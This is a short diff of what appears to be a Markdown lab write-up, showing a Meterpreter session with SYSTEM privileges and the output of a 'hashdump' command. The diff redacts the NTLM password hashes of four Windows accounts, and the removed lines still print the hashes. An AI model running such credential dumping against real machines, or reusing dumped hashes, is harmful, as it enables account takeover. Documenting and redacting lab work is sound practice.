@@ -226,10 +226,10 @@ Meterpreter     : x64/windows
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > hashdump
-Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:bae41ca591dff9f200a0cb95dd636d60:::
-Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-MIKE:1001:aad3b435b51404eeaad3b435b51404ee:49d1acab366daee51dcc3e9af958aced:::
+Administrador:500:████████████████████████████████:████████████████████████████████:::
+HomeGroupUser$:1002:████████████████████████████████:████████████████████████████████:::
+Invitado:501:████████████████████████████████:████████████████████████████████:::
+MIKE:1001:████████████████████████████████:████████████████████████████████:::
 ```
 
 
